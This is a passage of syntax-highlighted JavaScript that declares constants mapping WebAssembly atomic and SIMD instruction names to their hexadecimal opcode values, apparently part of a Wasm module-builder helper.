keyword">let</span> kExprI32AtomicAdd <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicAdd8U <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicAdd16U <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicSub <span class="token operator">=</span> <span class="token number">0x25</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicSub8U <span class="token operator">=</span> <span class="token number">0x27</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicSub16U <span class="token operator">=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicAnd <span class="token operator">=</span> <span class="token number">0x2c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicAnd8U <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicAnd16U <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicOr <span class="token operator">=</span> <span class="token number">0x33</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicOr8U <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicOr16U <span class="token operator">=</span> <span class="token number">0x36</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicXor <span class="token operator">=</span> <span class="token number">0x3a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicXor8U <span class="token operator">=</span> <span class="token number">0x3c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicXor16U <span class="token operator">=</span> <span class="token number">0x3d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicExchange <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicExchange8U <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicExchange16U <span class="token operator">=</span> <span class="token number">0x44</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicCompareExchange <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicCompareExchange8U <span class="token operator">=</span> <span class="token number">0x4a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32AtomicCompareExchange16U <span class="token operator">=</span> <span class="token number">0x4b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicLoad <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicLoad8U <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicLoad16U <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicLoad32U <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicStore <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicStore8U <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicStore16U <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicStore32U <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAdd <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAdd8U <span class="token operator">=</span> <span class="token number">0x22</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAdd16U <span class="token operator">=</span> <span class="token number">0x23</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAdd32U <span class="token operator">=</span> <span class="token number">0x24</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicSub <span class="token operator">=</span> <span class="token number">0x26</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicSub8U <span class="token operator">=</span> <span class="token number">0x29</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicSub16U <span class="token operator">=</span> <span class="token number">0x2a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicSub32U <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAnd <span class="token operator">=</span> <span class="token number">0x2d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAnd8U <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAnd16U <span class="token operator">=</span> <span class="token number">0x31</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicAnd32U <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicOr <span class="token operator">=</span> <span class="token number">0x34</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicOr8U <span class="token operator">=</span> <span class="token number">0x37</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicOr16U <span class="token operator">=</span> <span class="token number">0x38</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicOr32U <span class="token operator">=</span> <span class="token number">0x39</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicXor <span class="token operator">=</span> <span class="token number">0x3b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicXor8U <span class="token operator">=</span> <span class="token number">0x3e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicXor16U <span class="token operator">=</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicXor32U <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicExchange <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicExchange8U <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicExchange16U <span class="token operator">=</span> <span class="token number">0x46</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicExchange32U <span class="token operator">=</span> <span class="token number">0x47</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicCompareExchange <span class="token operator">=</span> <span class="token number">0x49</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicCompareExchange8U <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicCompareExchange16U <span class="token operator">=</span> <span class="token number">0x4d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64AtomicCompareExchange32U <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>      <span class="token comment">// Simd opcodes.</span>      <span class="token keyword">let</span> kExprS128LoadMem <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load8x8S <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load8x8U <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load16x4S <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load16x4U <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load32x2S <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load32x2U <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load8Splat <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load16Splat <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load32Splat <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load64Splat <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128StoreMem <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Const <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Shuffle <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Swizzle <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Splat <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Splat <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Splat <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2Splat <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Splat <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Splat <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16ExtractLaneS <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16ExtractLaneU <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16ReplaceLane <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtractLaneS <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtractLaneU <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ReplaceLane <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtractLane <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ReplaceLane <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ExtractLane <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI64x2ReplaceLane <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4ExtractLane <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4ReplaceLane <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2ExtractLane <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2ReplaceLane <span class="token operator">=</span> <span class="token number">0x22</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Eq <span class="token operator">=</span> <span class="token number">0x23</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Ne <span class="token operator">=</span> <span class="token number">0x24</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16LtS <span class="token operator">=</span> <span class="token number">0x25</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16LtU <span class="token operator">=</span> <span class="token number">0x26</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16GtS <span class="token operator">=</span> <span class="token number">0x27</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16GtU <span class="token operator">=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16LeS <span class="token operator">=</span> <span class="token number">0x29</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16LeU <span class="token operator">=</span> <span class="token number">0x2a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16GeS <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16GeU <span class="token operator">=</span> <span class="token number">0x2c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Eq <span class="token operator">=</span> <span class="token number">0x2d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Ne <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8LtS <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8LtU <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8GtS <span class="token operator">=</span> <span class="token number">0x31</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8GtU <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8LeS <span class="token operator">=</span> <span class="token number">0x33</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8LeU <span class="token operator">=</span> <span class="token number">0x34</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8GeS <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8GeU <span class="token operator">=</span> <span class="token number">0x36</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Eq <span class="token operator">=</span> <span class="token number">0x37</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Ne <span class="token operator">=</span> <span class="token number">0x38</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4LtS <span class="token operator">=</span> <span class="token number">0x39</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4LtU <span class="token operator">=</span> <span class="token number">0x3a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4GtS <span class="token operator">=</span> <span class="token number">0x3b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4GtU <span class="token operator">=</span> <span class="token number">0x3c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4LeS <span class="token operator">=</span> <span class="token number">0x3d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4LeU <span class="token operator">=</span> <span class="token number">0x3e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4GeS <span class="token operator">=</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4GeU <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Eq <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Ne <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Lt <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Gt <span class="token operator">=</span> <span class="token number">0x44</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Le <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Ge <span class="token operator">=</span> <span class="token number">0x46</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Eq <span class="token operator">=</span> <span class="token number">0x47</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Ne <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Lt <span class="token operator">=</span> <span class="token number">0x49</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Gt <span class="token operator">=</span> <span class="token number">0x4a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Le <span class="token operator">=</span> <span class="token number">0x4b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Ge <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Not <span class="token operator">=</span> <span class="token number">0x4d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128And <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128AndNot <span class="token operator">=</span> <span class="token number">0x4f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Or <span class="token operator">=</span> <span class="token number">0x50</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Xor <span class="token operator">=</span> <span class="token number">0x51</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Select <span class="token operator">=</span> <span class="token number">0x52</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprV128AnyTrue <span class="token operator">=</span> <span class="token number">0x53</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load8Lane <span class="token operator">=</span> <span class="token number">0x54</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load16Lane <span class="token operator">=</span> <span class="token number">0x55</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load32Lane <span class="token operator">=</span> <span class="token number">0x56</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load64Lane <span class="token operator">=</span> <span class="token number">0x57</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Store8Lane <span class="token operator">=</span> <span class="token number">0x58</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Store16Lane <span class="token operator">=</span> <span class="token number">0x59</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Store32Lane <span class="token operator">=</span> <span class="token number">0x5a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Store64Lane <span class="token operator">=</span> <span class="token number">0x5b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load32Zero <span class="token operator">=</span> <span class="token number">0x5c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprS128Load64Zero <span class="token operator">=</span> <span class="token number">0x5d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4DemoteF64x2Zero <span class="token operator">=</span> <span class="token number">0x5e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2PromoteLowF32x4 <span class="token operator">=</span> <span class="token number">0x5f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Abs <span class="token operator">=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Neg <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Popcnt <span class="token operator">=</span> <span class="token number">0x62</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16AllTrue <span class="token operator">=</span> <span class="token number">0x63</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16BitMask <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16SConvertI16x8 <span class="token operator">=</span> <span class="token number">0x65</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16UConvertI16x8 <span class="token operator">=</span> <span class="token number">0x66</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Ceil <span class="token operator">=</span> <span class="token number">0x67</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Floor <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4Trunc <span class="token operator">=</span> <span class="token number">0x69</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF32x4NearestInt <span class="token operator">=</span> <span class="token number">0x6a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Shl <span class="token operator">=</span> <span class="token number">0x6b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16ShrS <span class="token operator">=</span> <span class="token number">0x6c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16ShrU <span class="token operator">=</span> <span class="token number">0x6d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Add <span class="token operator">=</span> <span class="token number">0x6e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16AddSatS <span class="token operator">=</span> <span class="token number">0x6f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16AddSatU <span class="token operator">=</span> <span class="token number">0x70</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16Sub <span class="token operator">=</span> <span class="token number">0x71</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16SubSatS <span class="token operator">=</span> <span class="token number">0x72</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16SubSatU <span class="token operator">=</span> <span class="token number">0x73</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Ceil <span class="token operator">=</span> <span class="token number">0x74</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Floor <span class="token operator">=</span> <span class="token number">0x75</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16MinS <span class="token operator">=</span> <span class="token number">0x76</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16MinU <span class="token operator">=</span> <span class="token number">0x77</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16MaxS <span class="token operator">=</span> <span class="token number">0x78</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16MaxU <span class="token operator">=</span> <span class="token number">0x79</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2Trunc <span class="token operator">=</span> <span class="token number">0x7a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI8x16RoundingAverageU <span class="token operator">=</span> <span class="token number">0x7b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtAddPairwiseI8x16S <span class="token operator">=</span> <span class="token number">0x7c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtAddPairwiseI8x16U <span class="token operator">=</span> <span class="token number">0x7d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtAddPairwiseI16x8S <span class="token operator">=</span> <span class="token number">0x7e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ExtAddPairwiseI16x8U <span class="token operator">=</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Abs <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Neg <span class="token operator">=</span> <span class="token number">0x81</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Q15MulRSatS <span class="token operator">=</span> <span class="token number">0x82</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8AllTrue <span class="token operator">=</span> <span class="token number">0x83</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8BitMask <span class="token operator">=</span> <span class="token number">0x84</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8SConvertI32x4 <span class="token operator">=</span> <span class="token number">0x85</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8UConvertI32x4 <span class="token operator">=</span> <span class="token number">0x86</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8SConvertI8x16Low <span class="token operator">=</span> <span class="token number">0x87</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8SConvertI8x16High <span class="token operator">=</span> <span class="token number">0x88</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8UConvertI8x16Low <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8UConvertI8x16High <span class="token operator">=</span> <span class="token number">0x8a</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Shl <span class="token operator">=</span> <span class="token number">0x8b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ShrS <span class="token operator">=</span> <span class="token number">0x8c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ShrU <span class="token operator">=</span> <span class="token number">0x8d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Add <span class="token operator">=</span> <span class="token number">0x8e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8AddSatS <span class="token operator">=</span> <span class="token number">0x8f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8AddSatU <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Sub <span class="token operator">=</span> <span class="token number">0x91</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8SubSatS <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8SubSatU <span class="token operator">=</span> <span class="token number">0x93</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprF64x2NearestInt <span class="token operator">=</span> <span class="token number">0x94</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8Mul <span class="token operator">=</span> <span class="token number">0x95</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8MinS <span class="token operator">=</span> <span class="token number">0x96</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8MinU <span class="token operator">=</span> <span class="token number">0x97</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8MaxS <span class="token operator">=</span> <span class="token number">0x98</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8MaxU <span class="token operator">=</span> <span class="token number">0x99</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8RoundingAverageU <span class="token operator">=</span> <span class="token number">0x9b</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtMulLowI8x16S <span class="token operator">=</span> <span class="token number">0x9c</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtMulHighI8x16S <span class="token operator">=</span> <span class="token number">0x9d</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtMulLowI8x16U <span class="token operator">=</span> <span class="token number">0x9e</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI16x8ExtMulHighI8x16U <span class="token operator">=</span> <span class="token number">0x9f</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Abs <span class="token operator">=</span> <span class="token number">0xa0</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Neg <span class="token operator">=</span> <span class="token number">0xa1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4AllTrue <span class="token operator">=</span> <span class="token number">0xa3</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4BitMask <span class="token operator">=</span> <span class="token number">0xa4</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4SConvertI16x8Low <span class="token operator">=</span> <span class="token number">0xa7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4SConvertI16x8High <span class="token operator">=</span> <span class="token number">0xa8</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4UConvertI16x8Low <span class="token operator">=</span> <span class="token number">0xa9</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4UConvertI16x8High <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Shl <span class="token operator">=</span> <span class="token number">0xab</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ShrS <span class="token operator">=</span> <span class="token number">0xac</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4ShrU <span class="token operator">=</span> <span class="token number">0xad</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Add <span class="token operator">=</span> <span class="token number">0xae</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Sub <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4Mul <span class="token operator">=</span> <span class="token number">0xb5</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4MinS <span class="token operator">=</span> <span class="token number">0xb6</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> kExprI32x4MinU <span class="token operator">=</span> <span class="token number">0xb7</span><span class="token punctuation">;</span>      <span class="token keyword">let</span> 